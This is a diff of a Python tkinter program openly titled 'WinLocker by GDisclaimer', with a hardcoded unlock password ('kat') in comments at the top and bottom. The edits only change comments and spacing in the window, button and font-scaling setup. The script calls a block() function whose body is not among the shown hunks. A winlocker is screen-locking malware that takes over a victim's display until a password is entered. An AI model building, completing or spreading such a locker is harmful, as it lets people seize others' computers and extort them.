@@ -1,5 +1,7 @@
 #ВАЖНО ПАРОЛЬ:kat
 
+
+#Импортируем библиотеки
 import tkinter
 from tkinter import *
 import tkinter as tk
@@ -23,6 +25,7 @@ w = Label(window, image=photo)
 w.pack() 
 
 b1= Button(window, text='Нажми на меня', command=window.destroy) #Отвечает за кнопку закрытия
+
 b1.pack(pady=10)
 
 
@@ -30,6 +33,7 @@ window.resizable(0, 0) # Отвечает за изменение окна
 
 
 window.title("Kat")   # Название окна
+
 window['bg'] = 'black'
 
 
@@ -42,25 +46,20 @@ window.title("WinLocker by GDisclaimer")
 window.geometry('400x250')
 window['bg'] = 'black'
 
-# Base size
+
 normal_width = 1920
 normal_height = 1080
 
-# Get screen size
+
 screen_width = window.winfo_screenwidth()
 screen_height = window.winfo_screenheight()
 
-# Get percentage of screen size from Base size
+
 percentage_width = screen_width / (normal_width / 100)
 percentage_height = screen_height / (normal_height / 100)
 
-# Make a scaling factor, this is bases on average percentage from
-# width and height.
-scale_factor = ((percentage_width + percentage_height) / 2) / 100
 
-# Set the fontsize based on scale_factor,
-# if the fontsize is less than minimum_size
-# it is set to the minimum size
+scale_factor = ((percentage_width + percentage_height) / 2) / 100
 
 fontsize = int(20 * scale_factor)
 minimum_size = 10
@@ -72,7 +71,7 @@ minimum_size = 40
 if fontsizeHding < minimum_size:
        fontsizeHding = minimum_size
 
-# Create a style and configure for ttk.Button widget
+
 default_style = ttk.Style()
 default_style.configure('New.TButton', font=("Helvetica", fontsize))
 
@@ -126,4 +125,5 @@ btn.place(relx = .62, rely = .5, relwidth=.1, relheight=.06)
 block()
 
 window.mainloop()
+
 #ВАЖНО ПАРОЛЬ:kat
